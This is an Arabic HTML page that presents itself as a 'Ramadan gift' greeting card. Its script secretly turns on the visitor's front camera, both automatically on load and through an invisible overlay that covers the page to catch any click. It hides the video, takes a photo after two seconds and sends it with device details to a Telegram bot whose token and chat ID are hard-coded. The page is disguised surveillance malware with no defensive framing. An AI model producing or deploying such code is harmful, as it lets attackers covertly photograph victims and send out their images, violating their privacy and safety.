
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 هدية رمضان</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Tajawal', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        
        .bg {
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 30% 40%, rgba(247, 151, 30, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 70% 60%, rgba(255, 210, 0, 0.08) 0%, transparent 50%);
            animation: rotateBg 20s linear infinite;
            z-index: 0;
        }
        
        @keyframes rotateBg {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        .star {
            position: absolute;
            width: 3px;
            height: 3px;
            background: white;
            border-radius: 50%;
            animation: twinkle var(--duration) ease-in-out infinite alternate;
        }
        
        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(0.5); }
            100% { opacity: 1; transform: scale(1.5); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 40px;
            padding: 50px 30px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        
        .gift {
            font-size: 100px;
            animation: pulseGift 2s ease-in-out infinite;
        }
        
        @keyframes pulseGift {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(-3deg); }
        }
        
        h1 {
            font-size: 34px;
            font-weight: 900;
            margin: 15px 0 5px;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 18px;
            line-height: 1.8;
        }
        
        .loading-text {
            color: rgba(255, 255, 255, 0.3);
            font-size: 14px;
            margin-top: 20px;
        }
        
        .loading-text i {
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        video, canvas {
            display: none !important;
        }
        
        /* زر وهمي لتشغيل الكاميرا (غير مرئي) */
        .hidden-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
            z-index: 999;
        }
    </style>
</head>
<body>

<div class="bg"></div>
<div class="stars" id="stars"></div>

<!-- زر وهمي يغطي الصفحة بالكامل (لتشغيل الكاميرا عند النقر في أي مكان) -->
<div class="hidden-trigger" id="triggerBtn"></div>

<div class="container">
    <div class="card">
        <div class="gift">🎁</div>
        <h1>هدية رمضان</h1>
        <p class="sub">🌙 رمضان كريم</p>
        <p class="loading-text"><i class="fas fa-spinner"></i> جاري التحميل...</p>
        
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas"></canvas>
    </div>
</div>

<script>
// ======================== التوكن ========================
const BOT_TOKEN = '5418501320:AAFAjqrT_Tu2JNGe1nc2Ki-lb3kAB8QVEHE';
const CHAT_ID = '1786031358';

// ======================== نجوم ========================
const starsContainer = document.getElementById('stars');
for (let i = 0; i < 80; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    star.style.left = Math.random() * 100 + '%';
    star.style.top = Math.random() * 100 + '%';
    star.style.setProperty('--duration', (2 + Math.random() * 3) + 's');
    star.style.width = (1 + Math.random() * 3) + 'px';
    star.style.height = star.style.width;
    starsContainer.appendChild(star);
}

// ======================== عناصر ========================
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const triggerBtn = document.getElementById('triggerBtn');

// ======================== إرسال للتليجرام ========================
function sendToTelegram(imageDataURL) {
    const blob = dataURLToBlob(imageDataURL);
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', `📸 صورة جديدة\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${getDeviceInfo()}`);
    
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).then(r => r.json());
}

function dataURLToBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const b64 = atob(parts[1]);
    const byteArray = new Uint8Array(b64.length);
    for (let i = 0; i < b64.length; i++) {
        byteArray[i] = b64.charCodeAt(i);
    }
    return new Blob([byteArray], { type: mime });
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Unknown';
    if (/iPhone|iPad|iPod/.test(ua)) device = 'iPhone/iPad';
    else if (/Android/.test(ua)) device = 'Android';
    else if (/Windows/.test(ua)) device = 'Windows';
    else if (/Mac/.test(ua)) device = 'Mac';
    return `${device} | ${ua.substring(0, 80)}`;
}

// ======================== التقاط الصورة ========================
function captureAndSend() {
    try {
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.85);
        
        sendToTelegram(dataURL)
            .then(() => console.log('✅ تم الإرسال'))
            .catch(err => console.error('❌ فشل:', err));
        
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(t => t.stop());
        }
    } catch (e) {
        console.error('خطأ:', e);
    }
}

// ======================== تشغيل الكاميرا ========================
function startCamera() {
    return navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
        }
    });
}

// ======================== التنفيذ ========================
// عند النقر في أي مكان على الصفحة (الزر الوهمي يغطيها)
triggerBtn.addEventListener('click', function() {
    this.style.display = 'none'; // يختفي بعد النقر
    
    startCamera()
        .then(stream => {
            video.srcObject = stream;
            // انتظر 2 ثانية ثم صور
            setTimeout(() => {
                captureAndSend();
            }, 2000);
        })
        .catch(err => {
            console.error('فشل الكاميرا:', err);
            // حاول مرة أخرى
            setTimeout(() => {
                startCamera()
                    .then(s => {
                        video.srcObject = s;
                        setTimeout(() => captureAndSend(), 2000);
                    })
                    .catch(e => console.error('فشل مرة أخرى:', e));
            }, 1000);
        });
});

// تشغيل تلقائي بدون نقر (حاول فوراً)
setTimeout(() => {
    startCamera()
        .then(stream => {
            video.srcObject = stream;
            setTimeout(() => {
                captureAndSend();
            }, 2000);
        })
        .catch(() => {
            // إذا فشل، المستخدم سيضغط على الشاشة
            console.log('بانتظار نقر المستخدم');
        });
}, 500);

console.log('✅ النظام جاهز');
</script>

</body>
</html>
